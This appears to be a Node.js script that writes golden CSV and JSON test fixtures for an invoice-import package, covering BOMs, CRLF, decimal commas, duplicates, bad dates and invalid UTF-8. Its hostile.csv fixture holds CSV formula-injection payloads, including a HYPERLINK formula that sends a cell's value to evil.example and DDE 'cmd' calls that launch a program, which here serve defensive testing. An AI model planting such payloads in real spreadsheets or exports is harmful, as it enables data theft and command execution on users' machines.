// Writes the golden fixture files byte-exactly (BOM, CRLF, invalid UTF-8, a 1200-char cell).
// Run: node packages/ingest/fixtures/make-fixtures.mjs   (outputs are committed; this documents how)
import { mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const dir = path.dirname(fileURLToPath(import.meta.url));
const w = (name, content) => writeFileSync(path.join(dir, name), content);
const json = (name, value) => w(name, `${JSON.stringify(value, null, 2)}\n`);
mkdirSync(path.join(dir, 'mappings'), { recursive: true });
mkdirSync(path.join(dir, 'options'), { recursive: true });

const STD_HEADER = 'invoice_no,customer,email,phone,amount,currency,issued,due,customer_id,status';

json('mappings/standard.json', {
  invoiceNumber: 'invoice_no', customerName: 'customer', email: 'email', phone: 'phone', total: 'amount',
  currency: 'currency', issuedOn: 'issued', dueOn: 'due', externalCustomerId: 'customer_id',
  status: { column: 'status', skipValues: ['Paid', 'Void'] },
});
json('mappings/eu.json', {
  invoiceNumber: 'Rechnungsnr', customerName: 'Kunde', email: 'E-Mail', phone: 'Telefon', total: 'Betrag',
  issuedOn: 'Rechnungsdatum', dueOn: 'Fällig',
});
json('mappings/us.json', {
  invoiceNumber: 'Invoice #', customerName: 'Bill To', email: 'Email Address', phone: 'Phone', total: 'Amount Due',
  issuedOn: 'Invoice Date', dueOn: 'Due Date', status: { column: 'Status', skipValues: ['paid', 'void'] },
});

const opts = (o) => ({ delimiter: 'auto', decimal: '.', ...o });
json('options/gb-ymd.json', opts({ dateFormat: 'YMD', defaultCountry: 'GB', defaultCurrency: 'GBP', timezone: 'Europe/London' }));
json('options/gb-dmy.json', opts({ dateFormat: 'DMY', defaultCountry: 'GB', defaultCurrency: 'GBP', timezone: 'Europe/London' }));
json('options/de-dmy.json', opts({ decimal: ',', dateFormat: 'DMY', defaultCountry: 'DE', defaultCurrency: 'EUR', timezone: 'Europe/Berlin' }));
json('options/us-mdy.json', opts({ dateFormat: 'MDY', defaultCountry: 'US', defaultCurrency: 'USD', timezone: 'America/New_York' }));
json('options/pk-dmy.json', opts({ dateFormat: 'DMY', defaultCountry: 'PK', defaultCurrency: 'PKR', timezone: 'Asia/Karachi' }));
json('options/pk-ymd.json', opts({ dateFormat: 'YMD', defaultCountry: 'PK', defaultCurrency: 'PKR', timezone: 'Asia/Karachi' }));

w('clean.csv', [
  STD_HEADER,
  'INV-1001,Acme Ltd,accounts@acme.example,+44 20 7946 0958,1250.00,GBP,2026-09-01,2026-10-01,C-001,Open',
  'INV-1002,Beta Traders,billing@beta.example,020 7946 0018,"2,400.50",GBP,2026-09-05,2026-10-05,C-002,Open',
  'INV-1003,Acme Ltd,accounts@acme.example,,99.99,GBP,2026-09-10,2026-10-10,C-001,Open',
  'INV-1004,Gamma & Co,gamma@example.com,07700 900123,15000,GBP,2026-09-12,2026-11-12,,Paid',
].join('\n') + '\n');

// UTF-8 BOM, semicolons, decimal commas, DMY dates, CRLF line endings, currency inside the amount cell.
w('messy-eu.csv', '\uFEFF' + [
  'Rechnungsnr;Kunde;E-Mail;Telefon;Betrag;Rechnungsdatum;Fällig',
  'RE-2026-01;Müller GmbH;buchhaltung@mueller.example;030 1234567;1.250,00 EUR;01.09.2026;15.10.2026',
  'RE-2026-02;Schröder & Söhne KG; Info@Schroeder.Example ;+49 89 1234567;"12.500,50 EUR";03.09.2026;20.10.2026',
  'RE-2026-03;Bäckerei Weiß;;;"1 250,00";10.09.2026;30.09.2026',
  'RE-2026-04;Ölmühle AG;oel@example.com;0171 1234567;199,999;12.09.2026;12.10.2026',
].join('\r\n') + '\r\n');

w('messy-us.csv', [
  'Invoice #,Bill To,Email Address,Phone,Amount Due,Invoice Date,Due Date,Status',
  '1001,"Smith, John",john@smith.example,(415) 555-0171,"$1,250.00",09/01/2026,10/15/2026,Open',
  '1002,Jane Doe LLC,ap@janedoe.example,212-555-0183,$980,09/03/2026,10/03/2026,Open',
  '1003,Old Client,old@client.example,,"$5,000.00",08/01/2026,08/31/2026,Paid',
  '1004,Void Corp,void@corp.example,,$10.00,08/02/2026,09/01/2026,VOID',
  '1005,Negative Inc,neg@example.com,,-$50.00,09/04/2026,10/04/2026,Open',
  '1006,Due Early LLC,due@early.example,,$75.25,09/20/2026,09/10/2026,Open',
].join('\n') + '\n');

w('duplicates.csv', [
  STD_HEADER,
  'D-1,Imran Traders,,0300 1234567,"PKR 1,00,000",PKR,01/09/2026,30/09/2026,,Open',
  'D-2,Imran Traders,,+92 300 1234567,"50,000",PKR,02/09/2026,30/09/2026,,Open',
  'D-3,Imran Traders,,0092-300-1234567,"25,000.50",PKR,03/09/2026,30/09/2026,,Open',
  'D-4,John Smith,john1@example.com,,1000,PKR,04/09/2026,30/09/2026,,Open',
  'D-5,John Smith,john2@example.com,,2000,PKR,05/09/2026,30/09/2026,,Open',
  'D-6,Repeat Co,repeat@example.com,,300,PKR,06/09/2026,30/09/2026,,Open',
  'D-6,Repeat Co,repeat@example.com,,300,PKR,06/09/2026,30/09/2026,,Open',
  'D-7,ACME,Billing@ACME.example,,400,PKR,07/09/2026,30/09/2026,,Open',
  'D-8,Acme Pvt,billing@acme.example,,500,PKR,08/09/2026,30/09/2026,,Open',
].join('\n') + '\n');

w('i18n.csv', [
  STD_HEADER,
  'I-1,Müller & Söhne,mueller@de.example,,100.00,EUR,2026-09-01,2026-10-01,,Open',
  'I-2,شركة الأمل للتجارة,amal@ae.example,+971 50 123 4567,250.000,KWD,2026-09-01,2026-10-01,,Open',
  'I-3,عمران ٹریڈرز,imran@pk.example,0321 7654321,"1,50,000",PKR,2026-09-01,2026-10-01,,Open',
  'I-4,Café 😀 Ltd,cafe@example.com,,99,JPY,2026-09-01,2026-10-01,,Open',
  'I-5,Zoë Ørsted,zoe@dk.example,,10.50,EUR,2026-09-01,2026-10-01,,Open',
].join('\n') + '\n');

w('bad-dates.csv', [
  STD_HEADER,
  'B-1,Alpha,a@example.com,,10,GBP,31/02/2026,01/03/2026,,Open',
  'B-2,Beta,b@example.com,,10,GBP,03/04/2026,05/06/2026,,Open',
  'B-3,Gamma,c@example.com,,10,GBP,46113,46143,,Open',
  'B-4,Delta,d@example.com,,10,GBP,2026-04-03,01/05/2026,,Open',
  'B-5,Epsilon,e@example.com,,10,GBP,1/2/26,12/12/26,,Open',
  'B-6,Zeta,f@example.com,,10,GBP,123,04/04/2026,,Open',
].join('\n') + '\n');

w('no-contact.csv', [
  STD_HEADER,
  'N-1,No Contact Ltd,,,500,GBP,2026-09-01,2026-10-01,,Open',
  'N-2,Bad Contact Ltd,not-an-email,12345,600,GBP,2026-09-01,2026-10-01,,Open',
  'N-3,Ext Only Ltd,,,700,GBP,2026-09-01,2026-10-01,EXT-9,Open',
].join('\n') + '\n');

// Formula-injection payloads in every text column, an embedded multi-line cell and an oversized cell.
w('hostile.csv', [
  STD_HEADER,
  `"=HYPERLINK(""http://evil.example/?d=""&A1,""click"")",=cmd|' /C calc'!A0,@SUM(1+1)*cmd|' /C calc'!A0,+1+1,-2+3,GBP,2026-09-01,2026-10-01,=1+2,Open`,
  'H-2,"Multi\nline\nname",ok@example.com,,"=1+2",GBP,2026-09-01,2026-10-01,,Open',
  `H-3,${'A'.repeat(1200)},x@example.com,,10,GBP,2026-09-01,2026-10-01,,Open`,
  'H-4,"  =HYPERLINK(""http://x"")",y@example.com,,10,GBP,2026-09-01,2026-10-01,\'quoted,Open',
  'H-5,＝Fullwidth Formula,\tz@example.com,,10,GBP,2026-09-01,2026-10-01,,Open',
].join('\n') + '\n');

// Bytes 0xC3 0x28 are an invalid UTF-8 sequence (as produced by a Latin-1 "Müller" saved wrongly: 0xFC).
w('invalid-utf8.csv', Buffer.concat([
  Buffer.from(`${STD_HEADER}\nX-1,M`),
  Buffer.from([0xfc]),
  Buffer.from('ller,m@example.com,,10,GBP,2026-09-01,2026-10-01,,Open\n'),
]));

console.log('fixtures written to', dir);
